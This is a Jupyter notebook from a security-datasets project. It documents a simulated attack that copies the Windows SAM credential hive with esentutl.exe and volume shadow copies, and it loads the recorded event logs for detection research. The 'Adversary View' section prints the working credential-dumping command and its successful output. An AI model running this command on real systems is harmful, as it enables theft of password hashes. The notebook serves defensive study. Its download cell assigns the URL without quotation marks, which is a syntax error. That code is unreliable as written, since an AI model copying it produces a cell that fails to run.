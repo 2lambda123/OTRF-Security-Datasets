{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "a675294a",
   "metadata": {},
   "source": [
    "# SAM Copy via Esentutl VSS"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2f663e32",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c7cddc9d",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/19 |\n",
    "| Modification Date | 2020/10/19 |\n",
    "| Tactics           | [TA0006](https://attack.mitre.org/tactics/TA0006) |\n",
    "| Techniques        | [T1003.002](https://attack.mitre.org/techniques/T1003/002) |\n",
    "| Tags              | art.a90c2f4d-6726-444e-99d2-a00cd7c20480 |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f2f9c74a",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries copying the SAM hive using the esentutl.exe utility and volume shadow copy services."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "82943722",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c0273c51",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_sam_copy_esentutl.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_sam_copy_esentutl.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "07f8e660",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "59514666",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "49bf7865",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | Cmd | [Cmd](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d1e47e2b",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Microsoft Windows [Version 10.0.18363.1139]\n",
    "(c) 2019 Microsoft Corporation. All rights reserved.\n",
    "\n",
    "C:\\Users\\wardog>esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d C:\\ProgramData\\SAM\n",
    "\n",
    "Extensible Storage Engine Utilities for Microsoft(R) Windows(R)\n",
    "Version 10.0\n",
    "Copyright (C) Microsoft Corporation. All Rights Reserved.\n",
    "\n",
    "Initializing VSS subsystem...\n",
    "\n",
    "Initiating COPY FILE mode...\n",
    "    Source File: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\n",
    "Destination File: C:\\ProgramData\\SAM\n",
    "\n",
    "                      Copy Progress (% complete)\n",
    "\n",
    "          0    10   20   30   40   50   60   70   80   90  100\n",
    "          |----|----|----|----|----|----|----|----|----|----|\n",
    "          ...................................................\n",
    "\n",
    "        Total bytes read                = 0x9000 (36864) (0 MB)\n",
    "        Total bytes written             = 0x9000 (36864) (0 MB)\n",
    "\n",
    "\n",
    "Operation completed successfully in 4.859 seconds.\n",
    "\n",
    "C:\\Users\\wardog>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7908ef9c",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "05390f1d",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3e0ada5e",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_sam_copy_esentutl.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "67938b77",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "441efc96",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a2d6982e",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72cf7f49",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "74de2d41",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
